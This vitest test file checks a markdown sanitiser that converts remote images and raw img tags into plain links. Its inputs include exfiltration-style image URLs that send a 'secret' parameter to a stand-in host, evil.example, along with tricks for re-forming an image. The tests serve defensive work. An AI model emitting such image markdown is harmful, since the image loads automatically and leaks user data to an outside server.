import { describe, expect, it } from 'vitest'
import { neutralizeRemoteImages } from './safeMarkdown'

describe('neutralizeRemoteImages', () => {
  it('turns remote images into links', () => {
    expect(neutralizeRemoteImages('Hi ![x](https://evil.example/p?d=secret) there')).toBe('Hi [x](https://evil.example/p?d=secret) there')
  })
  it('keeps pasted (data:) images and vault paths', () => {
    const md = '![a](data:image/png;base64,AAAA)\n\n![b](attachments/pic.png)'
    expect(neutralizeRemoteImages(md)).toBe(md)
  })
  it('handles raw <img> tags', () => {
    expect(neutralizeRemoteImages('<img src="https://evil.example/x.png">')).toBe('[image](https://evil.example/x.png)')
  })
  it('cannot be tricked into re-forming an image', () => {
    for (const md of ['!![](https://evil.example/p?d=x)', 'x!![a](https://evil.example/p)', '!!!![](https://e.example/a)']) {
      expect(neutralizeRemoteImages(md)).not.toMatch(/!\[[^\]]*\]\(https?:/)
    }
  })
  it('leaves text without images alone', () => {
    expect(neutralizeRemoteImages('- a\n- b')).toBe('- a\n- b')
  })
})
